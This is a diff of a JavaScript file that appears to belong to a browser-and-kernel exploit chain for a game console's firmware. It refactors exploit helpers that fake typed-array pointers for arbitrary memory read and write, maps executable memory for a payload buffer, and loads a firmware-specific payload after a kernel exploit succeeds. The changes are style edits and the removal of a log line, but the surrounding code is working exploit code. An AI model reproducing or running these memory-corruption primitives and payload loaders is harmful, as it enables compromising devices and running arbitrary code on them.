@@ -1470,29 +1470,31 @@ export async function kexploit() {
   return false;
 }
 
-const malloc = (sz) => {
+function malloc(sz) {
   const backing = new Uint8Array(0x10000 + sz);
   nogc.push(backing);
   const ptr = mem.readp(mem.addrof(backing).add(0x10));
   ptr.backing = backing;
   return ptr;
-};
+}
 
-const malloc32 = (sz) => {
+function malloc32(sz) {
   const backing = new Uint8Array(0x10000 + sz * 4);
   nogc.push(backing);
   const ptr = mem.readp(mem.addrof(backing).add(0x10));
   ptr.backing = new Uint32Array(backing.buffer);
   return ptr;
-};
+}
 
-const array_from_address = (addr, size) => {
+function array_from_address(addr, size) {
   const og_array = new Uint32Array(0x1000);
   const og_array_i = mem.addrof(og_array).add(0x10);
-  mem.write64(og_array_i, addr).write32(og_array_i.add(8), size).write32(og_array_i.add(12), 1);
+  mem.write64(og_array_i, addr);
+  mem.write32(og_array_i.add(0x8), size);
+  mem.write32(og_array_i.add(0xC), 0x1);
   nogc.push(og_array);
   return og_array;
-};
+}
 
 const runBinLoader = () => {
   const payload_buffer = chain.sysp("mmap", 0, 0x300000, 7, 0x1000, 0xffffffff, 0);
@@ -1549,7 +1551,6 @@ const runPayload = (path) => {
 kexploit().then((success) => {
   if (success) {
     const payloadFile = getPayloadFile(version);
-    log(`loading payload for firmware ${hex(version)}: ${payloadFile}`);
     runPayload(`./${payloadFile}`);
   }
 });
